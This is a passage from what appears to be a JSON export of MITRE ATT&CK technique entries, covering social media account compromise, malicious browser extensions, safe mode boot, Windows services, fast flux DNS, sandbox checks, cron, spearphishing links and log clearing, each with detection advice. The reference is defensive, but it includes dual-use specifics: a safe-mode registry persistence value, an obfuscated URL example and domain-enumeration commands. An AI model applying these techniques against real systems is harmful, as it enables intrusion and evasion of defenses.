      "stix_id": "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e",
      "created": "2020-02-21T21:07:55.393000+00:00",
      "modified": "2025-04-15T19:58:14.718000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Group: Group Enumeration",
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)"
    },
    "T1586.001": {
      "id": "T1586.001",
      "name": "Social Media Accounts",
      "description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1586.001",
      "stix_id": "attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d",
      "created": "2020-10-01T01:18:35.535000+00:00",
      "modified": "2025-04-15T23:08:45.478000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Persona: Social Media",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
    },
    "T1176.001": {
      "id": "T1176.001",
      "name": "Browser Extensions",
      "description": "Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition) \n \nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions. \n  \nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles; however, <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS) \n \nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) \n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek) ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1176.001",
      "stix_id": "attack-pattern--278716b1-61ce-4a74-8d17-891d0c494101",
      "created": "2025-03-30T22:12:27.799000+00:00",
      "modified": "2025-04-15T19:58:15.232000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Creation",
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1562.009": {
      "id": "T1562.009",
      "name": "Safe Mode Boot",
      "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.009",
      "stix_id": "attack-pattern--28170e17-8384-415c-8486-2e6b294cb803",
      "created": "2021-06-23T20:00:27.600000+00:00",
      "modified": "2025-04-25T14:46:08.076000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Creation",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor Registry modification and additions for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a <code>\\*</code> in front of the \"Startup\" value name: <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[\"\\*Startup\"=\"{Path}\"]</code> or by adding a key to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal</code>.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019)\n\nMonitor execution of processes and commands associated with making configuration changes to boot settings, such as <code>bcdedit.exe</code> and <code>bootcfg.exe</code>.(Citation: Microsoft bcdedit 2021)(Citation: Microsoft Bootcfg)(Citation: Sophos Snatch Ransomware 2019)"
    },
    "T1542.005": {
      "id": "T1542.005",
      "name": "TFTP Boot",
      "description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1542.005",
      "stix_id": "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4",
      "created": "2020-10-20T00:06:56.180000+00:00",
      "modified": "2025-04-25T14:46:08.824000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation",
        "Firmware: Firmware Modification"
      ],
      "defense_bypassed": [],
      "detection": "Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)\n\nReview command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. (Citation: Cisco IOS Software Integrity Assurance - Command History) Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. (Citation: Cisco IOS Software Integrity Assurance - Boot Information) Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols."
    },
    "T1543.003": {
      "id": "T1543.003",
      "name": "Windows Service",
      "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1543.003",
      "stix_id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
      "created": "2020-01-17T19:13:50.402000+00:00",
      "modified": "2025-04-15T19:58:16.076000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow",
        "Service: Service Creation",
        "Command: Command Execution",
        "File: File Metadata",
        "Windows Registry: Windows Registry Key Creation",
        "Driver: Driver Load",
        "Service: Service Modification",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1568.001": {
      "id": "T1568.001",
      "name": "Fast Flux DNS",
      "description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1568.001",
      "stix_id": "attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6",
      "created": "2020-03-11T14:11:16.560000+00:00",
      "modified": "2025-04-25T14:46:09.378000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection."
    },
    "T1497.001": {
      "id": "T1497.001",
      "name": "System Checks",
      "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1497.001",
      "stix_id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
      "created": "2020-03-06T20:57:37.959000+00:00",
      "modified": "2025-04-15T19:58:16.253000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection."
    },
    "T1053.003": {
      "id": "T1053.003",
      "name": "Cron",
      "description": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1053.003",
      "stix_id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
      "created": "2019-12-03T14:25:00.538000+00:00",
      "modified": "2025-04-15T19:58:16.429000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Creation",
        "Scheduled Job: Scheduled Job Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. "
    },
    "T1069.002": {
      "id": "T1069.002",
      "name": "Domain Groups",
      "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1069.002",
      "stix_id": "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c",
      "created": "2020-02-21T21:15:06.561000+00:00",
      "modified": "2025-04-15T22:22:08.417000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Group: Group Enumeration",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1588.006": {
      "id": "T1588.006",
      "name": "Vulnerabilities",
      "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.006",
      "stix_id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
      "created": "2020-10-15T02:59:38.628000+00:00",
      "modified": "2025-04-15T23:19:21.267000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004))."
    },
    "T1566.002": {
      "id": "T1566.002",
      "name": "Spearphishing Link",
      "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1566.002",
      "stix_id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
      "created": "2020-03-02T19:15:44.182000+00:00",
      "modified": "2025-04-15T23:10:41.326000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "Identity Provider",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs."
    },
    "T1070.002": {
      "id": "T1070.002",
      "name": "Clear Linux or Mac System Logs",
      "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.002",
      "stix_id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
      "created": "2020-01-28T17:11:54.034000+00:00",
      "modified": "2025-04-15T21:56:45.103000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Deletion",
        "File: File Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files."
    },
    "T1499.004": {
      "id": "T1499.004",
      "name": "Application or System Exploitation",
      "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1499.004",
      "stix_id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
      "created": "2020-02-20T15:37:27.052000+00:00",
      "modified": "2025-04-15T21:50:12.334000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Sensor Health: Host Status",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS."
    },
    "T1137": {
      "id": "T1137",
      "name": "Office Application Startup",
